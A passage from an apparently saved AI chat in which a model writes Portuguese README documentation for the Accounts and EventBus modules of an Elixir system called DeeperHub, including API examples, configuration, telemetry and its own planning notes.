*   `DeeperHub.Accounts.Services.EmailVerificationWorker`: Gerencia verificação de email.
*   `DeeperHub.Accounts.FeatureFlags`: Consulta feature flags.
*   `DeeperHub.Accounts.Integrations.EventIntegration`: Publica eventos de domínio.
*   `DeeperHub.Core.EventBus`: Para publicação de eventos.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.ConfigManager`: Para configurações.

A estrutura de diretórios típica seria:

```
lib/deeper_hub/accounts/
├── accounts.ex             # Fachada Principal
├── feature_flags.ex
├── profile.ex              # Lógica do Profile Struct (se não for só schema)
├── session.ex              # Lógica de Sessão (se não for só schema/manager)
├── user.ex                 # Lógica do User Struct (se não for só schema)
│
├── integrations/
│   └── event_integration.ex
│
├── schema/
│   ├── profile.ex
│   ├── session.ex
│   └── user.ex
│
├── services/
│   ├── user_service.ex
│   ├── profile_service.ex
│   ├── registration_service.ex
│   ├── email_verification_worker.ex
│   └── session_cleanup_worker.ex
│
└── supervisor.ex
```

### 3.1. Componentes Principais

*   **`DeeperHub.Accounts` (Este módulo):** Ponto de entrada para todas as funcionalidades de contas.
*   **`DeeperHub.Accounts.Services.UserService`:** Lógica de negócio para usuários.
*   **`DeeperHub.Accounts.Services.ProfileService`:** Lógica de negócio para perfis.
*   **`DeeperHub.Accounts.Services.RegistrationService`:** Orquestra o fluxo de registro de novos usuários.
*   **`DeeperHub.Accounts.Schema.User`:** Schema Ecto para a entidade Usuário.
*   **`DeeperHub.Accounts.Schema.Profile`:** Schema Ecto para a entidade Perfil.
*   **`DeeperHub.Accounts.Schema.Session`:** Schema Ecto para a entidade Sessão.
*   **`DeeperHub.Accounts.Integrations.EventIntegration`:** Publica eventos de domínio significativos para o `Core.EventBus`.
*   **`DeeperHub.Accounts.FeatureFlags`:** Verifica flags de funcionalidades específicas de contas.
*   **`DeeperHub.Accounts.Supervisor`:** Supervisiona os workers e GenServers do módulo Accounts.
*   **Workers (`EmailVerificationWorker`, `SessionCleanupWorker`):** Processos GenServer para tarefas assíncronas.

### 3.3. Decisões de Design Importantes

*   **Fachada Explícita:** O uso de `DeeperHub.Accounts` como fachada única para o exterior promove baixo acoplamento e clareza sobre o ponto de entrada do módulo.
*   **Serviços Especializados:** A divisão das responsabilidades em serviços menores (`UserService`, `ProfileService`, etc.) facilita a manutenção e o teste de unidades de lógica específicas.
*   **Separação de Schema e Lógica:** Manter Schemas Ecto separados da lógica de serviço ajuda a manter o código organizado.
*   **Workers para Tarefas Assíncronas:** O uso de GenServers para tarefas como limpeza de sessão e envio de emails de verificação melhora a responsividade das operações síncronas.
*   **Delegação para `DeeperHub.Auth`:** Funcionalidades puras de autenticação (verificação de senha, MFA, etc.) são delegadas ao módulo `DeeperHub.Auth`, mantendo o `Accounts` focado no ciclo de vida e dados do usuário.

## 🛠️ 4. Casos de Uso Principais

*   **Registro de Novo Usuário:** Um visitante se cadastra na plataforma. O `DeeperHub.Accounts` recebe os dados, utiliza o `RegistrationService` para criar o usuário e o perfil, e potencialmente dispara um email de verificação.
*   **Login de Usuário:** Um usuário tenta se logar. `DeeperHub.Accounts` delega para `DeeperHub.Auth` para verificar as credenciais e, se bem-sucedido, gerencia a criação da sessão.
*   **Atualização de Perfil:** Um usuário logado atualiza suas informações de perfil. `DeeperHub.Accounts` usa o `ProfileService` para validar e persistir as alterações.
*   **Confirmação de Email:** Um usuário clica no link de confirmação. `DeeperHub.Accounts` usa o `UserService` (ou `EmailVerificationService`) para validar o token e marcar o email como confirmado.
*   **Administrador Lista Usuários:** Um administrador consulta a lista de usuários. `DeeperHub.Accounts` usa o `UserService` para buscar e paginar os usuários.

## 🌊 5. Fluxos Importantes (Opcional)

**Fluxo de Registro de Novo Usuário (`register_user/1`):**

1.  `DeeperHub.Accounts.register_user/1` é chamado com os atributos do usuário e perfil.
2.  A chamada é delegada para `DeeperHub.Accounts.Services.RegistrationService.register/1`.
3.  `RegistrationService` primeiro chama `DeeperHub.Accounts.Services.UserService.create_user/1` para criar a entidade `User`.
    *   Validações são aplicadas no `User.changeset`.
    *   Senha é hasheada.
    *   Usuário é persistido.
4.  Se a criação do usuário for bem-sucedida, `RegistrationService` chama `DeeperHub.Accounts.Services.ProfileService.create_profile/2` para criar o perfil associado.
    *   Validações são aplicadas no `Profile.changeset`.
    *   Perfil é persistido.
5.  `RegistrationService` emite um evento `UserRegisteredEvent` (ou `UserCreatedEvent`) através de `DeeperHub.Accounts.Integrations.EventIntegration` para o `Core.EventBus`.
6.  Se a verificação de email estiver habilitada (`FeatureFlags.email_verification_enabled?/1`), uma tarefa para enviar o email de verificação é enfileirada (possivelmente via `EmailVerificationWorker`).
7.  Retorna `{:ok, %{user: user, profile: profile}}` ou `{:error, reason}`.

## 📡 6. API (Se Aplicável)

Este módulo expõe uma API Elixir para ser consumida por outros módulos dentro do DeeperHub.

### 6.1. `DeeperHub.Accounts.register_user/1`

*   **Descrição:** Registra um novo usuário com informações de usuário e perfil.
*   **`@spec`:** `register_user(attrs :: map()) :: {:ok, %{user: User.t(), profile: Profile.t()}} | {:error, Ecto.Changeset.t() | term()}`
*   **Parâmetros:**
    *   `attrs` (map): Um mapa contendo chaves para os atributos do usuário (ex: `:email`, `:password`) e uma chave `:profile` com os atributos do perfil (ex: `:full_name`).
*   **Retorno:**
    *   `{:ok, %{user: user, profile: profile}}`: Em caso de sucesso, retorna o usuário e perfil criados.
    *   `{:error, changeset}`: Se houver falha na validação dos dados.
    *   `{:error, reason}`: Para outros erros internos.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    attrs = %{
      email: \"novo@exemplo.com\",
      password: \"Senha@123\",
      profile: %{full_name: \"Novo Usuário\"}
    }
    case DeeperHub.Accounts.register_user(attrs) do
      {:ok, %{user: user, profile: profile}} -> Logger.info(\"Usuário #{user.email} registrado com perfil #{profile.id}\")
      {:error, reason} -> Logger.error(\"Falha no registro: #{inspect(reason)}\")
    end
    ```

### 6.2. `DeeperHub.Accounts.authenticate/5`

*   **Descrição:** Autentica um usuário com email e senha, gerenciando o início da sessão.
*   **`@spec`:** `authenticate(email :: String.t(), password :: String.t(), ip_address :: String.t() | nil, user_agent :: String.t() | nil, geo_data :: map() | nil) :: {:ok, %{user: User.t(), session: Session.t(), token: String.t()}} | {:error, atom()}`
*   **Parâmetros:**
    *   `email` (String): O email do usuário.
    *   `password` (String): A senha do usuário.
    *   `ip_address` (String | nil): O endereço IP do cliente.
    *   `user_agent` (String | nil): O User-Agent do cliente.
    *   `geo_data` (map | nil): Dados geográficos da requisição.
*   **Retorno:**
    *   `{:ok, %{user: user, session: session, token: token}}`: Em caso de sucesso.
    *   `{:error, :invalid_credentials}`: Se as credenciais forem inválidas.
    *   `{:error, :user_locked}`: Se a conta estiver bloqueada.
    *   `{:error, :mfa_required}`: Se MFA for necessário para completar o login.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case DeeperHub.Accounts.authenticate(\"user@example.com\", \"password123\", \"127.0.0.1\", \"MyApp/1.0\", nil) do
      {:ok, auth_data} -> Logger.info(\"Usuário #{auth_data.user.id} autenticado.\")
      {:error, reason} -> Logger.error(\"Falha na autenticação: #{reason}\")
    end
    ```
    *(...documentar outras funções públicas importantes como `get_user/1`, `update_profile/2`, etc.)*

## ⚙️ 7. Configuração

O módulo `Accounts` e seus submódulos podem ser configurados através do `DeeperHub.Core.ConfigManager`.

*   **ConfigManager:**
    *   `[:accounts, :registration, :default_role]`: Papel padrão atribuído a novos usuários. (Padrão: `\"user\"`)
    *   `[:accounts, :profile, :max_bio_length]`: Comprimento máximo da biografia do usuário. (Padrão: `500`)
    *   `[:accounts, :profile, :avatar_storage_path]`: Caminho base para armazenamento de avatares (se local). (Padrão: `\"uploads/avatars\"`)
    *   `[:accounts, :email_verification, :token_ttl_hours]`: Tempo de vida (em horas) do token de verificação de email. (Padrão: `24`)
    *   `[:accounts, :session, :cleanup_interval_minutes]`: Intervalo (em minutos) para o worker de limpeza de sessões. (Padrão: `60`)
    *   **Feature Flags (via `DeeperHub.Accounts.FeatureFlags` que usa `ConfigManager`):**
        *   `[:accounts, :feature_flags, :registration_enabled]`: (Boolean) Habilita/desabilita o registro de novos usuários. (Padrão: `true`)
        *   `[:accounts, :feature_flags, :email_verification_enabled]`: (Boolean) Requer verificação de email para novos registros. (Padrão: `true`)
        *   `[:accounts, :feature_flags, :social_login_enabled, :google]`: (Boolean) Habilita login com Google. (Padrão: `false`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para acesso a configurações.
*   `DeeperHub.Core.EventBus`: Para publicação de eventos de domínio.
*   `DeeperHub.Core.Logger`: Para logging estruturado.
*   `DeeperHub.Core.Repo`: Para persistência de dados.
*   `DeeperHub.Auth`: Para funcionalidades de autenticação e gerenciamento de senhas e sessões.
*   `DeeperHub.Notifications` (indireta): Através de eventos, para enviar emails de verificação, etc.
*   `DeeperHub.Shared.Utils`: Para utilitários diversos.

### 8.2. Bibliotecas Externas

*   `Ecto`: Para interações com o banco de dados e definições de schema.
*   `Comeonin` ou `Argon2` (ou similar, via `DeeperHub.Auth`): Para hashing de senhas.
*   `Jason`: Para serialização/deserialização JSON (se houver APIs REST diretas ou para metadados de eventos).

## 🤝 9. Como Usar / Integração

Outros módulos devem interagir com as funcionalidades de contas exclusivamente através da fachada `DeeperHub.Accounts`.

**Exemplo de criação de um novo usuário:**
```elixir
attrs = %{
  email: \"test@example.com\",
  password: \"StrongPassword123!\",
  profile: %{full_name: \"Test User\"}
}
case DeeperHub.Accounts.register_user(attrs) do
  {:ok, %{user: user, profile: _profile}} ->
    IO.puts(\"Usuário criado: #{user.id}\")
  {:error, changeset} ->
    IO.puts(\"Erro ao criar usuário: #{inspect(changeset.errors)}\")
  {:error, reason} ->
    IO.puts(\"Erro interno: #{inspect(reason)}\")
end
```

**Exemplo de busca de perfil de usuário:**
```elixir
case DeeperHub.Accounts.get_profile(user_id) do
  {:ok, profile} ->
    IO.inspect(profile)
  {:error, :not_found} ->
    IO.puts(\"Perfil não encontrado.\")
  {:error, reason} ->
    IO.puts(\"Erro ao buscar perfil: #{inspect(reason)}\")
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários e de integração para o módulo `Accounts` e seus serviços estão localizados em `test/deeper_hub/accounts/`.
*   Para executar todos os testes do módulo: `mix test test/deeper_hub/accounts/`
*   Para executar um arquivo de teste específico: `mix test test/deeper_hub/accounts/user_service_test.exs`
*   Para executar um teste específico em um arquivo: `mix test test/deeper_hub/accounts/user_service_test.exs:15` (linha 15)
*   Cobertura de testes pode ser gerada com: `mix test --cover`

### 10.2. Métricas

O módulo `Accounts` (e seus componentes) emite métricas para o `DeeperHub.Core.Metrics` para monitoramento:

*   `deeper_hub.accounts.user.created.count` (Contador): Número de usuários criados.
*   `deeper_hub.accounts.user.login.success.count` (Contador): Número de logins bem-sucedidos.
*   `deeper_hub.accounts.user.login.failure.count` (Contador): Número de logins falhos.
*   `deeper_hub.accounts.profile.updated.count` (Contador): Número de perfis atualizados.
*   `deeper_hub.accounts.email.verified.count` (Contador): Número de emails verificados.
*   `deeper_hub.accounts.get_user.duration_ms` (Histograma): Duração da busca de usuário.
*   `deeper_hub.accounts.active_users.gauge` (Gauge): Número total de usuários ativos.

### 10.3. Logs

Logs gerados pelo módulo `Accounts` seguem o padrão do `DeeperHub.Core.Logger` e incluem automaticamente:
*   `{module: DeeperHub.Accounts}` ou o submódulo específico (ex: `{module: DeeperHub.Accounts.Services.UserService}`).
*   `{function: \"nome_da_funcao/aridade\"}`.
*   Operações críticas incluem `user_id` e `trace_id` (se aplicável) para rastreamento.
    Ex: `Logger.info(\"Usuário criado\", module: DeeperHub.Accounts.Services.UserService, user_id: user.id)`
    Ex: `Logger.error(\"Falha ao atualizar perfil\", module: DeeperHub.Accounts.Services.ProfileService, user_id: user.id, error: reason)`

### 10.4. Telemetria

O módulo `Accounts` emite eventos de telemetria através de `DeeperHub.Accounts.Integrations.EventIntegration` que são então manipulados pelo `Core.EventBus`. Eventos principais:

*   `[:deeper_hub, :accounts, :user, :created]`: Emitido após um novo usuário ser criado. Payload: `%{user: user_struct}`.
*   `[:deeper_hub, :accounts, :user, :updated]`: Emitido após um usuário ser atualizado. Payload: `%{user: user_struct, changes: changes_map}`.
*   `[:deeper_hub, :accounts, :user, :deleted]`: Emitido após um usuário ser deletado. Payload: `%{user_id: user_id}`.
*   `[:deeper_hub, :accounts, :profile, :updated]`: Emitido após um perfil ser atualizado. Payload: `%{profile: profile_struct, changes: changes_map}`.
*   `[:deeper_hub, :accounts, :email, :verified]`: Emitido quando um email é verificado. Payload: `%{user_id: user_id, email: email_string}`.
*   `[:deeper_hub, :accounts, :password, :changed]`: Emitido após a senha de um usuário ser alterada. Payload: `%{user_id: user_id}`.
*   `[:deeper_hub, :accounts, :session, :created]`: Emitido após uma nova sessão ser criada (login). Payload: `%{user_id: user_id, session_id: session_id}`.
*   `[:deeper_hub, :accounts, :session, :revoked]`: Emitido após uma sessão ser revogada (logout). Payload: `%{user_id: user_id, session_id: session_id}`.

## ❌ 11. Tratamento de Erros

*   Funções que podem falhar devido a dados inválidos geralmente retornam `{:error, changeset}` com os detalhes da validação.
*   Erros de \"não encontrado\" retornam `{:error, :not_found}`.
*   Erros de permissão (embora mais comuns em `DeeperHub.Auth`) podem retornar `{:error, :unauthorized}`.
*   Outros erros internos podem retornar `{:error, term()}` com uma descrição do erro.
*   É esperado que os chamadores tratem esses tipos de retorno usando `case` ou `with`.

## 🛡️ 12. Considerações de Segurança

*   **Dados Sensíveis:** Este módulo lida com dados pessoais (nome, email) e credenciais (senhas, via delegação para `DeeperHub.Auth`). As senhas nunca são armazenadas em texto plano.
*   **Validação de Entrada:** Todos os dados de entrada fornecidos pelo usuário são rigorosamente validados usando `Ecto.Changeset` para prevenir dados malformados e ataques comuns.
*   **Hashing de Senhas:** O hashing de senhas é delegado para `DeeperHub.Auth`, que utiliza algoritmos fortes (ex: Argon2, bcrypt).
*   **Tokens de Verificação:** Tokens de verificação de email são gerados com segurança, têm tempo de vida limitado e são de uso único.
*   **Controle de Acesso:** A modificação de dados de um usuário (perfil, senha) é restrita ao próprio usuário ou a administradores com as devidas permissões (verificado por `DeeperHub.Auth` ou `DeeperHub.RBAC`).
*   **Prevenção de Enumeração de Usuários:** Respostas a tentativas de login ou recuperação de senha não devem revelar se um email/usuário existe no sistema, para dificultar a enumeração.

## 🧑‍💻 13. Contribuição

Consulte as diretrizes gerais de contribuição do projeto DeeperHub.
*   Mantenha a separação entre a fachada `DeeperHub.Accounts` e os serviços internos.
*   Adicione testes para todas as novas funcionalidades e correções.
*   Siga os padrões de logging e métricas estabelecidos.
*   Ao adicionar novas operações que alteram estado, considere emitir eventos de domínio através de `EventIntegration`.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar gerenciamento de consentimento do usuário (LGPD/GDPR).
*   [ ] Adicionar opção para usuários solicitarem a exportação de seus dados.
*   [ ] Integrar com um serviço de enriquecimento de perfil (ex: Clearbit) opcional.
*   [ ] Permitir que usuários conectem múltiplas identidades sociais à mesma conta DeeperHub.
*   [ ] Refatorar `AccountManager` completamente para dentro dos novos serviços, se ainda houver resquícios.
*   Consultar `TODO:`s no código para tarefas pendentes.

---

*Última atualização: 2025-05-10*

---

Isso é um exemplo para um módulo. O processo seria repetido para cada um dos módulos identificados na nova estrutura, detalhando ao máximo suas características.

Espero que esta análise e o exemplo de README ajudem a estruturar a documentação do seu novo sistema DeeperHub! É um projeto ambicioso e com uma base já muito sólida."""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""perfeito, continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""O usuário pediu para \"continuar\". Isso significa que devo prosseguir com a tarefa de detalhar os módulos do sistema DeeperHub, seguindo o template de README fornecido e incorporando as melhorias e novas funcionalidades que sugeri anteriormente.

Minha estratégia será:

1.  **Revisitar a lista de módulos propostos** na minha resposta anterior, especialmente os do `Core` e os principais módulos de aplicação/domínio.
2.  **Para cada módulo significativo**, vou criar um arquivo README (mentalmente, neste caso, ou como uma seção separada na resposta).
3.  **Preencher cada seção do template** para o módulo em questão, baseando-me nas funcionalidades existentes (conforme o `modules_documentation.txt`) e adicionando as novas funcionalidades e integrações que sugeri.
4.  **Focar em detalhar TUDO**, conforme a instrução original: responsabilidades, funcionalidades chave, arquitetura interna (componentes, interações), APIs (funções públicas e/ou endpoints REST), configuração, dependências, testes, observabilidade, tratamento de erros, segurança, e melhorias futuras.
5.  **Priorizar os módulos Core primeiro**, pois eles são a base para os outros.
6.  **Depois, abordar os módulos de aplicação/domínio mais críticos** ou aqueles que tiveram mais informações no arquivo `modules_documentation.txt` para ter uma base sólida.

Vou começar com um módulo Core fundamental, como o `DeeperHub.Core.EventBus`, pois muitos outros módulos dependerão dele. Depois, talvez o `DeeperHub.Core.ConfigManager` ou `DeeperHub.Core.Logger`.

**Lembretes importantes das instruções do usuário:**
*   Categorizar, especificar e criar arquivos README.
*   Organizar, especificar e categorizar o máximo *todas* as características e itens.
*   Sempre especificar TUDO!
*   Manter a linguagem em Português (BR) e o uso de emojis 😊.
*   Adicionar novas funcionalidades que achar necessário para um sistema sólido em produção.
*   Detalhar a integração dos módulos entre si.

Vamos começar com `DeeperHub.Core.EventBus`.

---
**Rascunho mental para `DeeperHub.Core.EventBus`:**

*   **1. Visão Geral:** Sistema centralizado para publicação e assinatura de eventos, permitindo comunicação assíncrona e desacoplada. Baseado no `Elixir.DeeperHub.Core.Event.EventBus` e `Elixir.DeeperHub.Core.Event`.
*   **2. Responsabilidades e Funcionalidades:**
    *   Registrar assinantes para tópicos de eventos.
    *   Receber eventos publicados por outros módulos.
    *   Distribuir eventos para os assinantes corretos.
    *   Gerenciar a lógica de retry para entrega de eventos (se habilitado).
    *   Manter um histórico de eventos recentes (se habilitado).
    *   Suporte a tópicos com wildcards.
*   **3. Arquitetura e Design:**
    *   Componente Principal: `EventBus.Server` (GenServer) que gerencia assinaturas e a fila de eventos.
    *   Componente Auxiliar: `EventBus.Dispatcher` (poderia ser um `Task.Supervisor` ou workers dedicados) para enviar eventos aos assinantes, permitindo concorrência e isolamento de falhas de assinantes.
    *   Padrão: Pub/Sub.
    *   Armazenamento (Opcional, para persistência/histórico): ETS para assinaturas e eventos em trânsito; talvez Mnesia ou um banco de dados para histórico de eventos persistente.
    *   A lógica de retry pode envolver uma fila separada e um worker para reprocessamento.
*   **4. Casos de Uso:**
    *   `Accounts` publica `UserCreatedEvent` -> `Notifications` assina e envia email de boas-vindas.
    *   `Security` publica `SuspiciousLoginAttemptEvent` -> `Audit` assina e loga, `RiskManagement` assina e avalia.
*   **5. Fluxos Importantes:**
    *   Fluxo de Publicação: Módulo X chama `EventBus.publish/3` -> `EventBus.Server` recebe, identifica assinantes -> Eventos são enfileirados para `EventBus.Dispatcher`.
    *   Fluxo de Assinatura: Módulo Y chama `EventBus.subscribe/2` -> `EventBus.Server` registra o PID/nome do assinante para o tópico.
    *   Fluxo de Dispatch: `EventBus.Dispatcher` pega evento da fila -> Envia para cada assinante -> Lida com sucesso/falha (retry).
*   **6. API (Funções Públicas):**
    *   `publish(topic, payload, opts)`
    *   `subscribe(topic, subscriber_pid_or_name, opts)`
    *   `unsubscribe(topic, subscriber_pid_or_name)`
    *   `unsubscribe_all(subscriber_pid_or_name)`
    *   `get_event_history(topic, opts)` (Nova funcionalidade)
    *   `get_subscriber_count(topic)` (Nova funcionalidade)
*   **7. Configuração:**
    *   `[:core, :event_bus, :history_limit_per_topic]`
    *   `[:core, :event_bus, :retry_enabled]`
    *   `[:core, :event_bus, :retry_max_attempts]`
    *   `[:core, :event_bus, :retry_base_interval_ms]`
    *   `[:core, :event_bus, :retry_max_interval_ms]`
    *   `[:core, :event_bus, :dispatcher_pool_size]` (Nova)
    *   `[:core, :event_bus, :persistent_storage_adapter]` (Nova, para histórico persistente)
*   **8. Dependências:**
    *   Internas: `Core.Logger`, `Core.Metrics`, `Core.ConfigManager`.
    *   Externas: Nenhuma direta fundamental, mas pode usar `Jason` para serialização de payloads se forem para armazenamento externo.
*   **9. Como Usar / Integração:**
    *   Publicadores: `DeeperHub.Core.EventBus.publish(\"user.created\", %{user_id: 123})`
    *   Assinantes: No `init` de um GenServer: `DeeperHub.Core.EventBus.subscribe(\"user.created\", self())` e implementar `handle_info({:event, topic, payload}, state)`.
*   **10. Testes e Observabilidade:**
    *   Métricas: `events.published.count`, `events.delivered.count`, `events.failed.count`, `events.retried.count`, `queue_size.gauge`, `subscriber_count.gauge`.
    *   Logs: Atividade de publicação, dispatch, falhas de entrega, retries.
    *   Telemetria: Eventos Telemetry para cada etapa do ciclo de vida de um evento.
*   **11. Tratamento de Erros:**
    *   Falha de assinante não deve impedir outros.
    *   Lógica de retry para entregas. Dead-letter queue para falhas persistentes.
*   **12. Considerações de Segurança:**
    *   Payloads de eventos não devem conter dados excessivamente sensíveis não criptografados se houver persistência.
    *   Autenticação/Autorização de quem pode publicar/assinar quais tópicos (mais avançado, talvez não para v1).
*   **13. Contribuição:** Padrões para nomeação de tópicos (ex: `dominio.entidade.acao`).
*   **14. Melhorias Futuras:**
    *   Persistência de eventos em disco/DB.
    *   Dead-letter queue (DLQ) para eventos que falham consistentemente.
    *   Event Sourcing como um padrão mais amplo na aplicação.
    *   Filtragem de eventos no lado do assinante.

---

Continuarei com o módulo `DeeperHub.Core.EventBus` como primeiro exemplo."""),
                types.Part.from_text(text="""Ok, vamos continuar construindo a documentação detalhada para os módulos do novo sistema DeeperHub.

Começaremos com um dos módulos centrais, o `DeeperHub.Core.EventBus`, essencial para a comunicação desacoplada entre diferentes partes do sistema.

---

# Módulo: `DeeperHub.Core.EventBus` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.EventBus`

O módulo `DeeperHub.Core.EventBus` é o coração do sistema de publicação e assinatura de eventos (Pub/Sub) dentro do DeeperHub. Ele permite que diferentes módulos da aplicação se comuniquem de forma assíncrona e desacoplada, emitindo eventos quando ocorrem ações significativas e permitindo que outros módulos interessados reajam a esses eventos sem conhecimento direto uns dos outros. Isso promove uma arquitetura mais modular, extensível e resiliente. 😊

Exemplo: Quando um novo usuário é criado pelo módulo `DeeperHub.Accounts`, ele publica um evento `UserCreatedEvent`. O módulo `DeeperHub.Notifications` pode estar inscrito nesse evento para enviar um email de boas-vindas, e o módulo `DeeperHub.Audit` pode registrar o evento para fins de auditoria.

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Registro de Assinantes (Subscribers):**
    *   Permitir que módulos ou processos registrem interesse em tópicos de eventos específicos.
    *   Suporte a tópicos com wildcards para assinaturas mais flexíveis (ex: `user.*`, `payment.success`).
    *   Gerenciar o ciclo de vida das assinaturas, incluindo remoção automática de assinantes que terminam.
*   **Publicação de Eventos (Publishers):**
    *   Receber eventos de qualquer módulo do sistema.
    *   Validar (opcionalmente) o formato do evento e do payload.
*   **Distribuição de Eventos:**
    *   Identificar todos os assinantes para um determinado tópico de evento.
    *   Entregar cópias do evento para cada assinante de forma assíncrona e concorrente.
    *   Garantir que a falha na entrega para um assinante não afete a entrega para outros.
*   **Retentativa de Entrega (Retry Logic):**
    *   Implementar uma política de retentativa configurável para eventos que falham na entrega (ex: assinante temporariamente indisponível).
    *   Suporte a backoff exponencial entre as tentativas.
*   **Histórico de Eventos (Opcional e Configurável):**
    *   Manter um histórico limitado dos últimos N eventos publicados por tópico.
    *   Permitir que novos assinantes recebam eventos passados recentes ao se inscreverem (`receive_past` opção).
*   **Monitoramento e Observabilidade:**
    *   Expor métricas sobre o número de eventos publicados, entregues, falhos, em fila, etc.
    *   Registrar logs detalhados sobre a atividade do barramento de eventos.
*   **Persistência de Eventos (Avançado/Opcional):**
    *   Capacidade de integrar com um mecanismo de armazenamento persistente para garantir a entrega de eventos críticos mesmo após reinícios do sistema (ex: Kafka, RabbitMQ, ou uma tabela de banco de dados).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.EventBus.Server` (GenServer):**
    *   **Responsabilidade:** É o processo central que gerencia o estado do EventBus.
    *   **Estado Interno:**
        *   Tabela de Assinaturas: Mapeamento de tópicos de eventos para uma lista de PIDs de assinantes.
        *   Fila de Eventos (Opcional): Uma fila interna (ou delegada a um sistema de filas externo) para eventos aguardando dispatch.
        *   Histórico de Eventos: Buffer circular por tópico para eventos recentes (se habilitado).
        *   Configurações: Limites, políticas de retry, etc.
    *   **Interações:** Recebe chamadas de `publish`, `subscribe`, `unsubscribe`. Delega o dispatch real para `DispatcherWorkers` ou `Task.Supervisor`.
2.  **`DeeperHub.Core.EventBus.DispatcherWorker` (Pool de Workers ou `Task.Supervisor`):**
    *   **Responsabilidade:** Enviar eventos para os PIDs dos assinantes de forma isolada.
    *   **Interações:** Recebe um evento e uma lista de PIDs de assinantes do `EventBus.Server`. Tenta enviar a mensagem para cada PID. Reporta sucesso/falha de volta para o `EventBus.Server` (para lógica de retry ou DLQ).
3.  **`DeeperHub.Core.EventBus.RetryManager` (GenServer ou Worker):**
    *   **Responsabilidade:** Gerenciar eventos que falharam na entrega e precisam ser reenviados.
    *   **Estado Interno:** Fila de eventos para retry com timestamps da próxima tentativa.
    *   **Interações:** Recebe eventos falhados do `DispatcherWorker`. Agenda reenvios e os envia de volta para o `DispatcherWorker`.
4.  **`DeeperHub.Core.EventBus.StorageAdapter` (Behaviour e Implementações):**
    *   **Responsabilidade:** Abstrair a persistência de eventos para histórico ou garantia de entrega.
    *   **Implementações:** `EtsStorage` (para histórico em memória), `DbStorage` (para persistência em banco de dados), `NoOpStorage`.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/event_bus/
├── event_bus.ex                  # Fachada Pública: publish, subscribe, etc.
├── server.ex                     # GenServer principal
├── dispatcher_worker.ex          # Worker para enviar eventos
├── retry_manager.ex              # GenServer para gerenciar retries
├── event.ex                      # Struct para representar um evento (topic, payload, metadata)
│
├── storage/
│   ├── storage_adapter.ex        # Behaviour para adaptadores de armazenamento
│   ├── ets_storage.ex            # Implementação com ETS
│   └── db_storage.ex             # Implementação com Banco de Dados
│
└── supervisor.ex                 # Supervisor para os processos do EventBus
```

### 3.3. Decisões de Design Importantes

*   **Desacoplamento Total:** Nenhum publicador precisa conhecer os assinantes, e vice-versa.
*   **Entrega Assíncrona:** A publicação de eventos é uma operação rápida que não bloqueia o publicador. A entrega é feita em background.
*   **Resiliência de Assinantes:** A falha de um assinante em processar um evento não deve impedir a entrega para outros assinantes nem bloquear o EventBus.
*   **Configurabilidade:** Políticas de retry, limites de histórico e outros comportamentos são configuráveis via `Core.ConfigManager`.
*   **Observabilidade:** Métricas e logs detalhados são cruciais para entender o fluxo de eventos e diagnosticar problemas.

## 🛠️ 4. Casos de Uso Principais

*   **Notificação de Criação de Usuário:**
    *   `DeeperHub.Accounts` publica `DeeperHub.Core.EventBus.publish(\"user.created\", %{user_id: 123, email: \"a@b.com\"})`.
    *   `DeeperHub.Notifications` (inscrito em `\"user.created\"`) recebe o evento e envia um email de boas-vindas.
    *   `DeeperHub.Audit` (inscrito em `\"user.created\"`) recebe o evento e registra uma entrada de auditoria.
*   **Atualização de Cache em Tempo Real:**
    *   Um módulo de gerenciamento de `Servidores` publica `DeeperHub.Core.EventBus.publish(\"server.updated\", %{server_id: 456, changes: %{name: \"Novo Nome\"}})`.
    *   O `DeeperHub.Core.Cache` ou um serviço de cache específico (inscrito em `\"server.updated\"`) recebe o evento e invalida/atualiza a entrada de cache para o servidor 456.
*   **Processamento Assíncrono de Pedidos:**
    *   Módulo `DeeperHub.Orders` publica `DeeperHub.Core.EventBus.publish(\"order.placed\", %{order_id: 789, items: [...]})`.
    *   `DeeperHub.InventoryService` (inscrito) reserva itens.
    *   `DeeperHub.PaymentService` (inscrito) processa o pagamento.
    *   `DeeperHub.Notifications` (inscrito) envia confirmação ao usuário.

## 🌊 5. Fluxos Importantes

### 5.1. Fluxo de Publicação e Entrega de Evento

1.  **Publicador:** Um módulo (ex: `DeeperHub.Accounts`) chama `DeeperHub.Core.EventBus.publish(\"user.created\", payload, opts)`.
2.  **`EventBus.Server`:**
    *   Recebe a chamada `publish`.
    *   Cria uma `Event` struct com `topic`, `payload`, `metadata` (timestamp, event_id único).
    *   Se o histórico estiver habilitado, armazena o evento no buffer do tópico correspondente.
    *   Consulta a tabela de assinaturas para encontrar todos os PIDs inscritos no tópico `\"user.created\"` (ou padrões correspondentes como `\"user.*\"`).
3.  **Dispatch:**
    *   Para cada PID assinante, o `EventBus.Server` envia uma tarefa para um `DispatcherWorker` (ou usa `Task.async`).
    *   A tarefa contém o `Event` struct e o PID do assinante.
4.  **`DispatcherWorker`:**
    *   Tenta enviar o evento para o PID do assinante (ex: `send(subscriber_pid, {:event, topic, payload, metadata})`).
    *   **Sucesso:** Notifica o `EventBus.Server` (para métricas de entrega).
    *   **Falha (assinante morreu/ocupado):**
        *   Se a lógica de retry estiver habilitada para o evento/tópico, envia o evento e os detalhes da falha para o `RetryManager`.
        *   Senão, registra a falha (para métricas).
5.  **Assinante:**
    *   Recebe a mensagem `{:event, topic, payload, metadata}` em seu `handle_info/2`.
    *   Processa o evento.

### 5.2. Fluxo de Assinatura

1.  **Assinante:** Um processo (ex: um GenServer de `DeeperHub.Notifications`) chama `DeeperHub.Core.EventBus.subscribe(\"user.created\", self(), opts)` durante sua inicialização (`init/1`).
2.  **`EventBus.Server`:**
    *   Recebe a chamada `subscribe`.
    *   Adiciona o `self()` (PID do assinante) à lista de assinantes do tópico `\"user.created\"`.
    *   Monitora o PID do assinante para remoção automática em caso de término.
